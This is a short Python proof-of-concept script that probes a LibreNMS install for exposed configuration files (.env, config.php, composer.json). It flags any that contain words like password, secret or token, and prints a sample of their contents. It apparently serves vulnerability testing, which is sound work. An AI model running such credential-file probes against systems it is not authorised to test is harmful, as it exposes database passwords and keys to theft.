#!/usr/bin/env python3
"""
LibreNMS Information Disclosure Test
Demonstrates access to sensitive configuration files
"""

import requests
import sys

def test_info_disclosure(target_url):
    """測試信息洩露漏洞"""
    
    print(f"[*] Testing information disclosure on: {target_url}")
    
    # 敏感文件列表
    sensitive_files = [
        'config.php.default',
        'composer.json',
        '.env',
        'config.php'
    ]
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
    })
    
    found_files = []
    
    for file_path in sensitive_files:
        try:
            url = f"{target_url.rstrip('/')}/{file_path}"
            print(f"[*] Testing: {url}")
            
            response = session.get(url, timeout=10)
            
            if response.status_code == 200:
                content = response.text
                
                # 檢查是否包含敏感信息
                sensitive_keywords = [
                    'password', 'secret', 'key', 'db_', 'mysql', 
                    'database', 'config', 'auth', 'token'
                ]
                
                if any(keyword in content.lower() for keyword in sensitive_keywords):
                    print(f"[+] VULNERABLE: {file_path} accessible and contains sensitive data!")
                    print(f"    Size: {len(content)} bytes")
                    print(f"    Sample content: {content[:200]}...")
                    found_files.append(file_path)
                else:
                    print(f"[i] File accessible but no sensitive data detected: {file_path}")
            else:
                print(f"[-] File not accessible: {file_path} (HTTP {response.status_code})")
                
        except Exception as e:
            print(f"[-] Error testing {file_path}: {e}")
    
    print(f"\n[*] Summary: Found {len(found_files)} vulnerable files")
    return found_files

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: python3 test_info_disclosure.py <target_url>")
        print("Example: python3 test_info_disclosure.py http://localhost:8080")
        sys.exit(1)
    
    target = sys.argv[1]
    vulnerable_files = test_info_disclosure(target)
    
    if vulnerable_files:
        print(f"\n[!] VULNERABILITY CONFIRMED!")
        print(f"[!] Accessible sensitive files: {', '.join(vulnerable_files)}")
    else:
        print(f"\n[+] No information disclosure vulnerabilities detected")